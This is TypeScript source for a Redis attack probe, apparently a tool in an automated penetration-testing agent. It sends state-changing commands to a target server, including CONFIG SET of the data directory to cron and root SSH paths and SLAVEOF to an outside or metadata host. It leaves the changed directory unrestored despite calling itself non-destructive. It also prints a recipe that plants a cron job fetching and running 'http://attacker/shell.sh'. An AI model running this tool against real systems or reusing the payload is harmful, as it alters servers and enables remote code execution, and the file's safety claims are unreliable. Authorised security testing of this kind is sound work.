// T70 — redis_probe
// Raw TCP Redis probing: PING, CONFIG GET/SET, SLAVEOF, MODULE LOAD, EVAL Lua.

import * as net from 'node:net';
import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'redis_probe',
  description:
    'Redis security probe via raw TCP. Tests: unauthenticated access (PING), CONFIG GET dir, ' +
    'CONFIG SET dir+dbfilename for cron/SSH key write (RCE path), MODULE LOAD, SLAVEOF replication ' +
    'abuse, and EVAL Lua. No-auth Redis with CONFIG SET is a well-known RCE primitive.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'host',       type: 'string', required: true,  description: 'Redis host' },
    { name: 'port',       type: 'number', required: false, description: 'Redis port', default: 6379 },
    { name: 'password',   type: 'string', required: false, description: 'Redis AUTH password (optional)' },
    { name: 'oob_host',   type: 'string', required: false, description: 'OOB callback host for DNS confirmation' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Connection timeout ms', default: 10000 },
  ],
};

function redisCmd(...args: string[]): Buffer {
  const parts: string[] = [`*${args.length}\r\n`];
  for (const a of args) parts.push(`$${Buffer.byteLength(a)}\r\n${a}\r\n`);
  return Buffer.from(parts.join(''));
}

function sendRecv(host: string, port: number, commands: Buffer[], timeoutMs: number): Promise<string> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let data = '';
    const timer = setTimeout(() => { socket.destroy(); resolve(data || 'timeout'); }, timeoutMs);
    socket.setTimeout(timeoutMs);
    socket.connect(port, host, () => {
      for (const cmd of commands) socket.write(cmd);
    });
    socket.on('data', (chunk: Buffer) => { data += chunk.toString(); });
    socket.on('close', () => { clearTimeout(timer); resolve(data); });
    socket.on('error', (e: Error) => { clearTimeout(timer); resolve(`error: ${e.message}`); });
    socket.on('timeout', () => { clearTimeout(timer); socket.destroy(); resolve('timeout'); });
  });
}

export const redisProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const host = String(params.host || '');
    const port = Number(params.port || 6379);
    const password = params.password ? String(params.password) : undefined;
    const oobHost = params.oob_host ? String(params.oob_host) : undefined;
    const timeoutMs = Number(params.timeout_ms || 10000);

    if (!host) return { output: 'host required', parsed: { error: 'missing_host' } };

    const authCmds: Buffer[] = password ? [redisCmd('AUTH', password)] : [];
    const results: Array<{ test: string; response: string; interesting: boolean; note: string }> = [];

    async function run(label: string, cmds: Buffer[], interestingFn: (r: string) => boolean, note: string) {
      const resp = await sendRecv(host, port, [...authCmds, ...cmds], timeoutMs);
      const interesting = interestingFn(resp);
      results.push({ test: label, response: resp.substring(0, 200).replace(/\r\n/g, ' '), interesting, note });
      return resp;
    }

    // 1. PING — basic connectivity
    await run('ping', [redisCmd('PING')], r => r.includes('+PONG'), 'Basic connectivity + no-auth check');

    // 2. INFO server
    await run('info_server', [redisCmd('INFO', 'server')], r => r.includes('redis_version'), 'Server info disclosure');

    // 3. CONFIG GET dir
    await run('config_get_dir', [redisCmd('CONFIG', 'GET', 'dir')], r => r.includes('dir') && !r.includes('-ERR'), 'Config read — RCE pre-req');

    // 4. CONFIG SET dir → cron path (detection only — does not write payload)
    await run('config_set_cron', [redisCmd('CONFIG', 'SET', 'dir', '/var/spool/cron/crontabs')], r => r.includes('+OK'), 'CONFIG SET to cron dir accepted — RCE path open');

    // 5. CONFIG SET dir → SSH path
    await run('config_set_ssh', [redisCmd('CONFIG', 'SET', 'dir', '/root/.ssh')], r => r.includes('+OK'), 'CONFIG SET to .ssh dir accepted — SSH key write possible');

    // 6. SLAVEOF (replication abuse)
    const slaveHost = oobHost || '169.254.169.254';
    await run('slaveof', [redisCmd('SLAVEOF', slaveHost, '9999')], r => r.includes('+OK'), 'SLAVEOF accepted — replication can exfil full dataset');

    // 7. EVAL Lua (code execution)
    await run('eval_lua', [redisCmd('EVAL', 'return redis.call("INFO")', '0')], r => r.includes('redis_version'), 'EVAL Lua RCE path — executes server-side Lua');

    // 8. ACL LOG (modern Redis — check ACL state)
    await run('acl_whoami', [redisCmd('ACL', 'WHOAMI')], r => !r.includes('-ERR'), 'ACL WHOAMI — identity check');

    // 9. DEBUG SLEEP (DoS probe — 0 seconds, just tests command availability)
    await run('debug_sleep', [redisCmd('DEBUG', 'SLEEP', '0')], r => r.includes('+OK'), 'DEBUG SLEEP accepted — DoS available');

    // Restore SLAVEOF NO ONE to be non-destructive
    await sendRecv(host, port, [...authCmds, redisCmd('SLAVEOF', 'NO', 'ONE')], timeoutMs);

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `redis_probe — ${host}:${port}${password ? ' (authenticated)' : ' (unauthenticated)'}`,
      `Interesting findings: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ VULN    ' : r.response.startsWith('error') ? '✗ ERR     ' : '  ·       ';
      lines.push(`  ${flag}  [${r.test.padEnd(18)}]  ${r.note}`);
      if (r.interesting) lines.push(`            Response: "${r.response.substring(0, 80)}"`);
    }

    if (interesting.some(r => r.test === 'config_set_cron' || r.test === 'config_set_ssh')) {
      lines.push('');
      lines.push('RCE PATH: CONFIG SET dir + dbfilename + SAVE → write file to cron/SSH');
      lines.push('  Steps: CONFIG SET dir /var/spool/cron/crontabs');
      lines.push('         CONFIG SET dbfilename root');
      lines.push('         SET payload "\\n\\n* * * * * curl http://attacker/shell.sh|bash\\n\\n"');
      lines.push('         BGSAVE');
    }

    return {
      output: lines.join('\n'),
      parsed: { host, port, interesting_count: interesting.length, interesting, results },
    };
  },
};
